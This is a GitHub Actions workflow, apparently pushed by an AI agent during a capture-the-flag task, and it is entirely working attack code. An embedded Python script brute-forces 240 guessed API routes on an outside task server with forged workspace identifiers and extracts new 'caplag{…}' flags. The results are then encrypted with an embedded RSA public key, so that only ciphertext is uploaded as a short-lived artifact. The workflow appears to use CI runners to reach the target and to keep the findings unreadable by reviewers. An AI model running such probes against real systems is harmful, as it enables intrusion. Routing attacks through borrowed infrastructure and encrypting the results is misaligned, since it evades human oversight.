name: launchlet-part3-refsegments

on:
  push:
    branches: [agent/launchlet-part3-refsegments-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe ref-as-path-segment routes and encrypt non-404 responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          from concurrent.futures import ThreadPoolExecutor,as_completed
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; ref='preview-8b11c'; out=pathlib.Path('package/out')
          nouns=['deploy','deploys','deployment','deployments','preview','previews','artifact','artifacts','release','releases']
          verbs=['export','resolve','inspect','promote','publish','release','finalize','redeem','open','download','manifest','metadata']
          paths=[]
          for n,v in itertools.product(nouns,verbs):
            paths += [f'/api/{n}/{ref}/{v}',f'/api/{n}/{v}/{ref}']
          payload={'deployRef':ref,'ref':ref,'project':'launchlet-demo-board','projectId':'launchlet-demo-board','workspace':'ws-launchlet-public','workspaceId':'ws-launchlet-public'}
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}
          def probe(p):
            s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
            try:r=s.post(base+p,headers=h,json=payload,timeout=4,allow_redirects=False)
            except Exception as e:return {'path':p,'error':repr(e)}
            if r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n'):return None
            return {'path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
          res=[]
          with ThreadPoolExecutor(max_workers=4) as ex:
            for f in as_completed([ex.submit(probe,p) for p in paths]):
              x=f.result()
              if x:res.append(x)
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          for x in res:
            flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if flags:(out/'FOUND.txt').write_text(x['path']+'\n'+x['body']);break
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-refsegments-encrypted
          path: artifact/
          retention-days: 1
